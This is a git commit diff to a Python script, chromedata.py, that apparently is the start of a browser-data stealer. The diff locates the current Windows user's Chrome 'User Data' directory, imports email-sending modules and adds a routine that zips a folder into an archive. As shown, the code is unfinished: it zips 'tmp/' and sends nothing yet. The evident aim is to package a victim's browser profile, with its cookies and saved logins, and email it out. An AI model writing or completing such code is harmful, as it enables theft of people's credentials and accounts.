19a185e617e1e5d0c8a4cc851b0bbadd09d6ac87
shaaaarky <155846610+shaaaarky@users.noreply.github.com>
2024-02-05 12:00:33 +0100

    slow work

--- python/chromedata.py
+++ python/chromedata.py
@@ -1,13 +1,22 @@
 import os
 import zipfile
-# Modules for working with emails
-import smtplib, ssl
+import smtplib
+from email.mime.text import MIMEText
 
 # Find the user of computer and store it
 user = os.getlogin()
-# Getting the directory 
-chrome_data_dir = f"C:\\Users\\{user}\\AppData\\Local\\Google\\Chrome\\User Data"
-# os.chdir(chrome_data_dir)
-# print(os.getcwd())
 
+chrome_data_dir = f"C:\\Users\\{user}\\AppData\\Local\\Google\\Chrome\\User Data"
+
+
+def zipdir(path, ziph):
+    # ziph is zipfile handle
+    for root, dirs, files in os.walk(path):
+        for file in files:
+            ziph.write(os.path.join(root, file), 
+                       os.path.relpath(os.path.join(root, file), 
+                                       os.path.join(path, '..')))
+
+with zipfile.ZipFile('Python.zip', 'w', zipfile.ZIP_DEFLATED) as zipf:
+    zipdir('tmp/', zipf)
 
